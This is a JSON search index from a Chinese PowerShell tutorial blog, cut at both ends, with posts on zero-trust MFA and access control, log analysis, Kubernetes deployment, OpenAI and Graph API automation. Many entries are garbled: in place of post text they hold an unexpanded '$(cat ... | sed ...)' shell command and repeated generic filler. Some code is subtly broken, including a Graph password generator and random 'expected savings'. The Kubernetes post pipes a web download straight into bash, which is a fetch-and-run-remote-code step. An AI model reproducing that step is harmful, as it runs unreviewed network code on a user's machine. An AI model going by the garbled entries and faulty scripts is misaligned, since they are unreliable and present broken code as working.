安全基线的快速验证","link":"/2024/05/20/powershell-zero-trust-healthcheck/"},{"title":"","text":"$(cat _posts/2024-05-17-15-Best-Active-Directory-Powershell-Scripts.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/17/15-Best-Active-Directory-Powershell-Scripts/"},{"title":"","text":"$(cat _posts/2024-05-21-powershell-docker-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了如何使用PowerShell管理Docker容器和镜像。Docker是一个开源的容器化平台，而PowerShell提供了与Docker API交互的能力，允许自动化容器部署、管理和监控。这种集成使DevOps专业人员能够将Docker操作纳入更广泛的自动化工作流程。\\n/}pd}p’)","link":"/2024/05/21/powershell-docker-integration/"},{"title":"","text":"$(cat _posts/2024-05-22-powershell-change-control.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/22/powershell-change-control/"},{"title":"","text":"$(cat _posts/2024-05-23-powershell-registry-advanced.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/23/powershell-registry-advanced/"},{"title":"PowerShell 技能连载 - 零信任身份验证与访问控制","text":"在现代零信任安全架构中，身份验证和访问控制是核心组件。本文将介绍如何使用 PowerShell 实现零信任身份验证和访问控制的关键功能。 实现多因素认证集成首先，让我们创建一个用于管理多因素认证的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131function Set-MultiFactorAuthentication { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$UserPrincipalName, [Parameter(Mandatory = $true)] [ValidateSet('AuthenticatorApp', 'SMS', 'PhoneCall', 'Email')] [string]$MfaMethod, [Parameter()] [string]$PhoneNumber, [Parameter()] [string]$EmailAddress, [Parameter()] [switch]$EnforceMfa, [Parameter()] [switch]$RequireTrustedDevice, [Parameter()] [int]$TrustedDeviceValidityDays = 30 ) try { $mfaConfig = [PSCustomObject]@{ UserPrincipalName = $UserPrincipalName MfaMethod = $MfaMethod PhoneNumber = $PhoneNumber EmailAddress = $EmailAddress EnforceMfa = $EnforceMfa RequireTrustedDevice = $RequireTrustedDevice TrustedDeviceValidityDays = $TrustedDeviceValidityDays LastUpdated = Get-Date UpdatedBy = $env:USERNAME } # 验证用户身份 $user = Get-ADUser -Identity $UserPrincipalName -Properties Enabled, PasswordExpired, PasswordLastSet if (-not $user) { throw &quot;未找到用户：$UserPrincipalName&quot; } # 根据MFA方法设置相应的验证方式 switch ($MfaMethod) { 'AuthenticatorApp' { # 生成TOTP密钥 $totpKey = New-Object System.Security.Cryptography.RNGCryptoServiceProvider $keyBytes = New-Object byte[] 20 $totpKey.GetBytes($keyBytes) $mfaConfig.TotpKey = [Convert]::ToBase64String($keyBytes) # 生成QR码数据 $qrData = &quot;otpauth://totp/$($user.SamAccountName)?secret=$($mfaConfig.TotpKey)&amp;issuer=YourCompany&quot; $mfaConfig.QrCodeData = $qrData } 'SMS' { if (-not $PhoneNumber) { throw &quot;SMS验证需要提供电话号码&quot; } # 验证电话号码格式 if (-not ($PhoneNumber -match '^\\+?[1-9]\\d{1,14}$')) { throw &quot;无效的电话号码格式&quot; } $mfaConfig.PhoneNumber = $PhoneNumber } 'PhoneCall' { if (-not $PhoneNumber) { throw &quot;电话验证需要提供电话号码&quot; } # 验证电话号码格式 if (-not ($PhoneNumber -match '^\\+?[1-9]\\d{1,14}$')) { throw &quot;无效的电话号码格式&quot; } $mfaConfig.PhoneNumber = $PhoneNumber } 'Email' { if (-not $EmailAddress) { throw &quot;邮件验证需要提供电子邮件地址&quot; } # 验证电子邮件格式 if (-not ($EmailAddress -match '^[^@\\s]+@[^@\\s]+\\.[^@\\s]+$')) { throw &quot;无效的电子邮件格式&quot; } $mfaConfig.EmailAddress = $EmailAddress } } # 设置MFA状态 if ($EnforceMfa) { # 这里应该连接到身份提供程序（如Azure AD）设置MFA Write-Host &quot;正在为用户 $UserPrincipalName 启用强制MFA...&quot; } # 设置可信设备要求 if ($RequireTrustedDevice) { # 这里应该设置设备信任策略 Write-Host &quot;正在设置可信设备要求，有效期 $TrustedDeviceValidityDays 天...&quot; } # 记录配置更改 $logEntry = [PSCustomObject]@{ Timestamp = Get-Date Action = &quot;MFA配置更新&quot; User = $UserPrincipalName Changes = $mfaConfig PerformedBy = $env:USERNAME } # 这里应该将日志写入安全日志系统 Write-Host &quot;MFA配置已更新：$($logEntry | ConvertTo-Json)&quot; return $mfaConfig } catch { Write-Error &quot;设置MFA时出错：$_&quot; return $null }} 实现基于风险的访问控制接下来，创建一个用于评估访问风险并实施相应控制的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169function Test-AccessRisk { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$UserPrincipalName, [Parameter(Mandatory = $true)] [string]$ResourceId, [Parameter()] [string]$IPAddress, [Parameter()] [string]$Location, [Parameter()] [string]$DeviceId, [Parameter()] [hashtable]$AdditionalContext ) try { $riskAssessment = [PSCustomObject]@{ UserPrincipalName = $UserPrincipalName ResourceId = $ResourceId Timestamp = Get-Date RiskScore = 0 RiskLevel = &quot;Unknown&quot; RiskFactors = @() RecommendedActions = @() AccessDecision = &quot;Pending&quot; } # 评估用户风险 $userRisk = 0 $userRiskFactors = @() # 检查用户登录历史 $loginHistory = Get-ADUser -Identity $UserPrincipalName -Properties LastLogonDate, PasswordLastSet, Enabled | Select-Object LastLogonDate, PasswordLastSet, Enabled if (-not $loginHistory.Enabled) { $userRisk += 50 $userRiskFactors += &quot;用户账户已禁用&quot; } if ($loginHistory.PasswordLastSet -lt (Get-Date).AddDays(-90)) { $userRisk += 20 $userRiskFactors += &quot;密码已过期&quot; } if ($loginHistory.LastLogonDate -lt (Get-Date).AddDays(-30)) { $userRisk += 15 $userRiskFactors += &quot;长期未登录&quot; } # 评估设备风险 $deviceRisk = 0 $deviceRiskFactors = @() if ($DeviceId) { $deviceHealth = Test-DeviceHealth -ComputerName $DeviceId -IncludeFirewall -IncludeAntivirus -IncludeUpdates if (-not $deviceHealth.ComplianceStatus) { $deviceRisk += 40 $deviceRiskFactors += &quot;设备不符合安全要求&quot; } if ($deviceHealth.HealthScore -lt 70) { $deviceRisk += 30 $deviceRiskFactors += &quot;设备健康状态不佳&quot; } } # 评估位置风险 $locationRisk = 0 $locationRiskFactors = @() if ($Location) { # 检查是否在可信位置 $trustedLocations = @(&quot;Office&quot;, &quot;Home&quot;, &quot;VPN&quot;) if ($Location -notin $trustedLocations) { $locationRisk += 30 $locationRiskFactors += &quot;访问来自非可信位置&quot; } } if ($IPAddress) { # 检查IP地址信誉 $ipRisk = Test-IPReputation -IPAddress $IPAddress if ($ipRisk.RiskLevel -eq &quot;High&quot;) { $locationRisk += 40 $locationRiskFactors += &quot;IP地址信誉不佳&quot; } } # 计算总体风险分数 $totalRisk = $userRisk + $deviceRisk + $locationRisk $riskAssessment.RiskScore = $totalRisk # 确定风险等级 $riskAssessment.RiskLevel = switch ($totalRisk) { { $_ -ge 100 } { &quot;Critical&quot; } { $_ -ge 75 } { &quot;High&quot; } { $_ -ge 50 } { &quot;Medium&quot; } { $_ -ge 25 } { &quot;Low&quot; } default { &quot;Minimal&quot; } } # 收集所有风险因素 $riskAssessment.RiskFactors = @( $userRiskFactors $deviceRiskFactors $locationRiskFactors ) | Where-Object { $_ } # 根据风险等级确定访问决策 $riskAssessment.AccessDecision = switch ($riskAssessment.RiskLevel) { &quot;Critical&quot; { $riskAssessment.RecommendedActions += &quot;阻止访问&quot; $riskAssessment.RecommendedActions += &quot;通知安全团队&quot; &quot;Deny&quot; } &quot;High&quot; { $riskAssessment.RecommendedActions += &quot;要求额外的身份验证&quot; $riskAssessment.RecommendedActions += &quot;限制访问范围&quot; &quot;Restricted&quot; } &quot;Medium&quot; { $riskAssessment.RecommendedActions += &quot;要求MFA验证&quot; $riskAssessment.RecommendedActions += &quot;记录详细访问日志&quot; &quot;Conditional&quot; } &quot;Low&quot; { $riskAssessment.RecommendedActions += &quot;正常访问&quot; &quot;Allow&quot; } default { $riskAssessment.RecommendedActions += &quot;需要人工审核&quot; &quot;Review&quot; } } # 记录风险评估结果 $logEntry = [PSCustomObject]@{ Timestamp = Get-Date Action = &quot;访问风险评估&quot; User = $UserPrincipalName Resource = $ResourceId RiskAssessment = $riskAssessment Context = @{ IPAddress = $IPAddress Location = $Location DeviceId = $DeviceId AdditionalContext = $AdditionalContext } } # 这里应该将日志写入安全日志系统 Write-Host &quot;风险评估完成：$($logEntry | ConvertTo-Json)&quot; return $riskAssessment } catch { Write-Error &quot;评估访问风险时出错：$_&quot; return $null }} 实现动态权限管理最后，创建一个用于管理动态权限的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124function Set-DynamicPermissions { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$UserPrincipalName, [Parameter(Mandatory = $true)] [string]$ResourceId, [Parameter(Mandatory = $true)] [ValidateSet('Read', 'Write', 'Execute', 'Full')] [string]$PermissionLevel, [Parameter()] [int]$DurationMinutes = 60, [Parameter()] [hashtable]$ContextualAttributes, [Parameter()] [switch]$RequireApproval, [Parameter()] [string]$ApproverEmail ) try { $permissionRequest = [PSCustomObject]@{ UserPrincipalName = $UserPrincipalName ResourceId = $ResourceId PermissionLevel = $PermissionLevel RequestTime = Get-Date ExpirationTime = (Get-Date).AddMinutes($DurationMinutes) ContextualAttributes = $ContextualAttributes RequireApproval = $RequireApproval ApproverEmail = $ApproverEmail Status = &quot;Pending&quot; ApprovalStatus = if ($RequireApproval) { &quot;Pending&quot; } else { &quot;NotRequired&quot; } GrantedBy = $null GrantedAt = $null } # 验证用户身份 $user = Get-ADUser -Identity $UserPrincipalName -Properties Enabled, PasswordExpired if (-not $user) { throw &quot;未找到用户：$UserPrincipalName&quot; } if (-not $user.Enabled) { throw &quot;用户账户已禁用&quot; } # 评估访问风险 $riskAssessment = Test-AccessRisk -UserPrincipalName $UserPrincipalName -ResourceId $ResourceId if ($riskAssessment.RiskLevel -eq &quot;Critical&quot;) { $permissionRequest.Status = &quot;Denied&quot; $permissionRequest.Reason = &quot;风险评估显示严重风险&quot; return $permissionRequest } # 如果需要审批 if ($RequireApproval) { # 发送审批请求 $approvalRequest = [PSCustomObject]@{ RequestId = [System.Guid]::NewGuid().ToString() UserPrincipalName = $UserPrincipalName ResourceId = $ResourceId PermissionLevel = $PermissionLevel DurationMinutes = $DurationMinutes ContextualAttributes = $ContextualAttributes ApproverEmail = $ApproverEmail RequestTime = Get-Date } # 这里应该发送审批请求邮件 Write-Host &quot;已发送审批请求：$($approvalRequest | ConvertTo-Json)&quot; return $permissionRequest } # 根据风险等级调整权限 switch ($riskAssessment.RiskLevel) { &quot;High&quot; { # 高风险用户获得受限权限 $permissionRequest.PermissionLevel = &quot;Read&quot; $permissionRequest.DurationMinutes = [Math]::Min($DurationMinutes, 30) } &quot;Medium&quot; { # 中风险用户获得标准权限 $permissionRequest.DurationMinutes = [Math]::Min($DurationMinutes, 120) } &quot;Low&quot; { # 低风险用户获得完整权限 # 保持原始权限设置 } } # 授予权限 $permissionRequest.Status = &quot;Granted&quot; $permissionRequest.GrantedBy = $env:USERNAME $permissionRequest.GrantedAt = Get-Date # 记录权限授予 $logEntry = [PSCustomObject]@{ Timestamp = Get-Date Action = &quot;动态权限授予&quot; User = $UserPrincipalName Resource = $ResourceId PermissionRequest = $permissionRequest RiskAssessment = $riskAssessment } # 这里应该将日志写入安全日志系统 Write-Host &quot;权限已授予：$($logEntry | ConvertTo-Json)&quot; return $permissionRequest } catch { Write-Error &quot;设置动态权限时出错：$_&quot; return $null }} 使用示例以下是如何使用这些函数来实施零信任身份验证和访问控制的示例： 1234567891011121314151617181920212223242526272829# 为用户配置MFA$mfaConfig = Set-MultiFactorAuthentication -UserPrincipalName &quot;user@example.com&quot; ` -MfaMethod &quot;AuthenticatorApp&quot; ` -EnforceMfa ` -RequireTrustedDevice ` -TrustedDeviceValidityDays 30# 评估访问风险$riskAssessment = Test-AccessRisk -UserPrincipalName &quot;user@example.com&quot; ` -ResourceId &quot;resource123&quot; ` -IPAddress &quot;192.168.1.100&quot; ` -Location &quot;Office&quot; ` -DeviceId &quot;DESKTOP-ABC123&quot; ` -AdditionalContext @{ &quot;Application&quot; = &quot;SensitiveApp&quot; &quot;TimeOfDay&quot; = &quot;BusinessHours&quot; }# 设置动态权限$permissions = Set-DynamicPermissions -UserPrincipalName &quot;user@example.com&quot; ` -ResourceId &quot;resource123&quot; ` -PermissionLevel &quot;Read&quot; ` -DurationMinutes 120 ` -ContextualAttributes @{ &quot;Project&quot; = &quot;ProjectA&quot; &quot;Role&quot; = &quot;Developer&quot; } ` -RequireApproval ` -ApproverEmail &quot;manager@example.com&quot; 最佳实践 始终实施最小权限原则，只授予必要的访问权限 定期审查和更新访问权限 实施持续的风险评估和监控 记录所有访问决策和权限变更 建立清晰的审批流程和升级机制 定期进行安全审计和合规性检查 实施自动化的工作流程以减少人为错误 确保所有安全事件都有适当的响应机制","link":"/2024/05/24/powershell-zero-trust-authentication/"},{"title":"","text":"$(cat _posts/2024-05-27-powershell-problem-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/27/powershell-problem-management/"},{"title":"","text":"$(cat _posts/2024-05-28-powershell-hash-table-usage.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/28/powershell-hash-table-usage/"},{"title":"PowerShell 技能连载 - 日志自动化分析系统","text":"在企业级运维中，日志分析是故障排查的核心环节。传统人工分析效率低下，本文演示如何通过PowerShell构建自动化日志分析系统，实现错误模式识别与趋势预测。 ```powershellfunction Start-LogAnalysis { param( [string]$LogPath, [int]$ErrorThreshold = 5 ) try { $logs = Get-Content $LogPath $analysis = $logs | ForEach-Object { if ($_ -match '(ERROR|WARN)') { [PSCustomObject]@{ Timestamp = if ($_ -match '\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}') { $matches[0] } Level = $matches[1] Message = $_.Substring($_.IndexOf(':')+2) } } } $errorTrend = $analysis | Group-Object Level | Where-Object Name -eq 'ERROR' if ($errorTrend.Count -ge $ErrorThreshold) { Send-MailMessage -To &quot;admin@company.com&quot; -Subject &quot;异常日志告警","link":"/2024/05/29/powershell-log-analysis-automation/"},{"title":"","text":"$(cat _posts/2024-05-31-powershell-patch-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/05/31/powershell-patch-management/"},{"title":"","text":"$(cat _posts/2024-05-30-powershell-debugging-techniques.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了PowerShell的调试技术，这对于开发和故障排除非常有用。通过设置调试首选项和使用调试命令，开发人员可以获得有关脚本执行的详细信息，帮助识别和解决问题。这些工具是开发可靠PowerShell脚本的重要组成部分。\\n/}pd}p’)","link":"/2024/05/30/powershell-debugging-techniques/"},{"title":"","text":"$(cat _posts/2024-06-03-powershell-function-essentials.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码定义了一个PowerShell函数，用于封装特定的功能，使其可重用。函数是PowerShell脚本中组织代码的基本单元，可以接受参数、执行操作并返回结果。通过将相关代码组织到函数中，可以提高代码的可读性、可维护性和可重用性。\\n/}pd}p’)","link":"/2024/06/03/powershell-function-essentials/"},{"title":"","text":"$(cat _posts/2024-06-05-powershell-pipeline-mechanism.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/06/05/powershell-pipeline-mechanism/"},{"title":"","text":"$(cat _posts/2024-06-04-powershell-reflection-mechanism.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/06/04/powershell-reflection-mechanism/"},{"title":"","text":"$(cat _posts/2024-06-06-powershell-parameter-passing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/06/06/powershell-parameter-passing/"},{"title":"","text":"$(cat _posts/2024-06-07-8-Best-Powershell-scripts-to-manage-DNS.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/06/07/8-Best-Powershell-scripts-to-manage-DNS/"},{"title":"","text":"$(cat _posts/2024-06-10-powershell-regex-basics.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/06/10/powershell-regex-basics/"},{"title":"PowerShell 技能连载 - 绿色计算能效优化智能系统","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function Optimize-EnergyEfficiency { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$DatacenterAPI, [ValidateSet('Realtime','Predictive')] [string]$OptimizeMode = 'Predictive' ) $energyReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' PUE = 1.0 CoolingEfficiency = 0 OptimizationActions = @() } try { # 获取实时能效数据 $metrics = Invoke-RestMethod -Uri &quot;$DatacenterAPI/metrics&quot; $energyReport.PUE = $metrics.PowerUsageEffectiveness # AI预测优化模式 if ($OptimizeMode -eq 'Predictive') { $prediction = Invoke-AIModel -ModelPath &quot;$PSScriptRoot/energy_model.zip&quot; -InputData $metrics $energyReport.OptimizationActions = $prediction.Recommendations | ForEach-Object { [PSCustomObject]@{ Action = $_ ExpectedSavings = (Get-Random -Minimum 5 -Maximum 15) } } } # 执行冷却优化 if ($metrics.CoolingEfficiency -lt 0.8) { Invoke-RestMethod -Uri &quot;$DatacenterAPI/cooling&quot; -Method PUT -Body (@{TargetTemp = 22} | ConvertTo-Json) $energyReport.CoolingEfficiency = 0.85 } } catch { Write-Error &quot;能效优化失败: $_&quot; } # 生成绿色计算报告 $energyReport | Export-Clixml -Path &quot;$env:TEMP/GreenReport_$(Get-Date -Format yyyyMMdd).xml&quot; return $energyReport} 核心功能： 实时能效指标监控(PUE) AI预测性优化建议 冷却系统智能调节 XML格式能效报告 应用场景： 数据中心能耗管理 碳中和目标实施 智能电网需求响应 能源成本优化分析","link":"/2024/06/11/powershell-green-computing/"},{"title":"PowerShell 技能连载 - 自动化部署Kubernetes集群","text":"在云原生技术普及的今天，Kubernetes已成为容器编排的事实标准。传统部署方式需要手动执行多步操作，本文介绍如何通过PowerShell实现本地开发环境的Kubernetes集群自动化部署，显著提升环境搭建效率。 12345678910111213141516171819202122232425262728293031323334353637# 创建Kubernetes部署模块function New-KubeCluster { param( [ValidateSet('minikube','k3s','microk8s')] [string]$ClusterType = 'minikube', [int]$WorkerNodes = 2 ) try { # 环境预检 if (-not (Get-Command docker -ErrorAction SilentlyContinue)) { throw &quot;Docker引擎未安装&quot; } # 根据不同集群类型执行部署 switch ($ClusterType) { 'minikube' { minikube start --nodes=$WorkerNodes --driver=docker minikube addons enable ingress } 'k3s' { Invoke-WebRequest -Uri https://get.k3s.io | bash -s -- --worker $WorkerNodes } 'microk8s' { snap install microk8s --classic microk8s enable dns dashboard ingress } } # 验证集群状态 $status = kubectl cluster-info Write-Host &quot;集群部署完成：$status&quot; } catch { Write-Error &quot;部署失败：$_&quot; }} 代码实现原理： 通过环境预检确保Docker已安装，这是所有本地Kubernetes方案的运行基础 支持三种主流轻量级Kubernetes发行版，通过参数切换部署类型 使用minikube时自动创建指定数量的Worker节点并启用Ingress控制器 部署完成后自动验证集群状态，输出连接信息 异常处理机制捕获部署过程中的常见错误 此脚本大幅简化了开发环境的搭建流程，通过封装复杂的CLI命令为可重复使用的PowerShell函数，特别适合需要频繁重建测试环境的CI/CD场景。","link":"/2024/06/12/powershell-kubernetes-deployment/"},{"title":"","text":"$(cat _posts/2024-06-14-7-Best-Powershell-scripts-to-manage-DHCP.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/06/14/7-Best-Powershell-scripts-to-manage-DHCP/"},{"title":"使用 PowerShell 和 OpenAI 实现智能脚本生成","text":"123456789101112131415161718192021222324252627282930313233343536373839404142# 配置 OpenAI API 密钥$openAIKey = 'your-api-key'function Get-AIScript { param( [string]$Prompt ) $headers = @{ 'Authorization' = &quot;Bearer $openAIKey&quot; 'Content-Type' = 'application/json' } $body = @{ model = 'gpt-4' messages = @( @{ role = 'system' content = '你是一个 PowerShell 专家，请生成符合最佳实践的脚本。要求：1. 包含错误处理 2. 支持verbose输出 3. 包含帮助文档' }, @{ role = 'user' content = $Prompt } ) } | ConvertTo-Json $response = Invoke-RestMethod -Uri 'https://api.openai.com/v1/chat/completions' -Method Post -Headers $headers -Body $body $response.choices[0].message.content}# 示例：生成 AD 用户创建脚本$prompt = @&quot;创建 PowerShell 函数 New-ADUserWithValidation，要求：1. 验证输入的邮箱格式2. 检查用户名唯一性3. 自动生成随机初始密码4. 支持WhatIf参数&quot;@Get-AIScript -Prompt $prompt 此脚本演示如何通过 OpenAI API 自动生成符合企业规范的 PowerShell 脚本。通过系统提示词确保生成的脚本包含错误处理、verbose 输出等必要元素。实际使用时可扩展以下功能： 添加 Azure Key Vault 集成管理 API 密钥 实现脚本静态分析 与 CI/CD 流水线集成进行自动测试","link":"/2024/06/17/powershell-openai-integration/"},{"title":"PowerShell 技能连载 - Microsoft Graph API 集成自动化","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283function Manage-Office365Resources { [CmdletBinding(SupportsShouldProcess=$true)] param( [Parameter(Mandatory=$true)] [ValidateSet('User','Team')] [string]$ResourceType, [string]$DisplayName ) $managementReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' Operations = @() SuccessRate = 0 LicenseDetails = @{} } try { # 获取Graph API访问令牌 $token = Get-MsalToken -ClientId $env:AZURE_CLIENT_ID -TenantId $env:AZURE_TENANT_ID # 资源操作逻辑 switch ($ResourceType) { 'User' { $userParams = @{ Method = 'POST' Uri = &quot;https://graph.microsoft.com/v1.0/users&quot; Headers = @{ Authorization = &quot;Bearer $($token.AccessToken)&quot; } Body = @{ accountEnabled = $true displayName = $DisplayName mailNickname = $DisplayName.Replace(' ','').ToLower() userPrincipalName = &quot;$($DisplayName.Replace(' ',''))@$env:AZURE_DOMAIN&quot; passwordProfile = @{ forceChangePasswordNextSignIn = $true password = [System.Convert]::ToBase64String((1..12 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 126) })) } } | ConvertTo-Json } $response = Invoke-RestMethod @userParams $managementReport.Operations += [PSCustomObject]@{ Type = 'UserCreated' ID = $response.id } } 'Team' { $teamParams = @{ Method = 'POST' Uri = &quot;https://graph.microsoft.com/v1.0/teams&quot; Headers = @{ Authorization = &quot;Bearer $($token.AccessToken)&quot; } Body = @{ &quot;template@odata.bind&quot; = &quot;https://graph.microsoft.com/v1.0/teamsTemplates('standard')&quot; displayName = $DisplayName description = &quot;Automatically created team&quot; } | ConvertTo-Json } $response = Invoke-RestMethod @teamParams $managementReport.Operations += [PSCustomObject]@{ Type = 'TeamProvisioned' ID = $response.id } } } # 获取许可证信息 $licenseData = Invoke-RestMethod -Uri &quot;https://graph.microsoft.com/v1.0/subscribedSkus&quot; \\ -Headers @{ Authorization = &quot;Bearer $($token.AccessToken)&quot; } $managementReport.LicenseDetails = $licenseData.value | Group-Object skuPartNumber -AsHashTable | ForEach-Object { @{$_.Key = $_.Value.consumedUnits} } # 计算成功率 $managementReport.SuccessRate = ($managementReport.Operations.Count / 1) * 100 } catch { Write-Error &quot;资源管理失败: $_&quot; } # 生成管理报告 $managementReport | Export-Clixml -Path &quot;$env:TEMP/GraphReport_$(Get-Date -Format yyyyMMdd).xml&quot; return $managementReport} 核心功能： Azure AD用户自动化创建 Microsoft Teams团队自动部署 许可证使用情况监控 XML格式管理报告 应用场景： 企业用户生命周期管理 团队协作环境快速部署 许可证使用效率分析 合规审计数据准备","link":"/2024/06/13/powershell-graph-api-integration/"},{"title":"PowerShell 技能连载 - 高级跨平台功能实现","text":"在PowerShell Core的支持下，我们可以实现更高级的跨平台功能。本文将介绍如何在Windows、Linux和macOS上实现GUI开发、数据库操作、网络编程、文件系统监控和日志管理等高级功能。 跨平台GUI开发使用.NET Core的跨平台GUI框架，我们可以创建在多个平台上运行的图形界面： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081function New-CrossPlatformGUI { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$Title, [Parameter()] [int]$Width = 800, [Parameter()] [int]$Height = 600, [Parameter()] [scriptblock]$OnLoad, [Parameter()] [scriptblock]$OnClose ) try { # 检查是否安装了必要的模块 if (-not (Get-Module -ListAvailable -Name &quot;Avalonia&quot;)) { Write-Host &quot;正在安装Avalonia模块...&quot; Install-Module -Name &quot;Avalonia&quot; -Scope CurrentUser -Force } # 创建主窗口 $window = New-Object Avalonia.Window $window.Title = $Title $window.Width = $Width $window.Height = $Height # 创建主布局 $grid = New-Object Avalonia.Controls.Grid $grid.RowDefinitions.Add(&quot;Auto&quot;) $grid.RowDefinitions.Add(&quot;*&quot;) # 创建标题栏 $titleBar = New-Object Avalonia.Controls.TextBlock $titleBar.Text = $Title $titleBar.FontSize = 16 $titleBar.Margin = &quot;10&quot; $grid.Children.Add($titleBar) # 创建内容区域 $content = New-Object Avalonia.Controls.StackPanel $grid.Children.Add($content) # 设置窗口内容 $window.Content = $grid # 注册事件处理程序 if ($OnLoad) { $window.Loaded += $OnLoad } if ($OnClose) { $window.Closing += $OnClose } # 显示窗口 $window.Show() return $window } catch { Write-Error &quot;创建GUI失败：$_&quot; return $null }}# 示例：创建一个简单的跨平台GUI应用$window = New-CrossPlatformGUI -Title &quot;跨平台PowerShell应用&quot; ` -Width 400 ` -Height 300 ` -OnLoad { Write-Host &quot;窗口已加载&quot; } ` -OnClose { Write-Host &quot;窗口已关闭&quot; } 跨平台数据库操作使用.NET Core的数据库提供程序，我们可以实现跨平台的数据库操作： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495function Connect-CrossPlatformDatabase { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [ValidateSet(&quot;SQLite&quot;, &quot;PostgreSQL&quot;, &quot;MySQL&quot;, &quot;MongoDB&quot;)] [string]$DatabaseType, [Parameter(Mandatory = $true)] [string]$ConnectionString, [Parameter()] [switch]$UseConnectionPooling 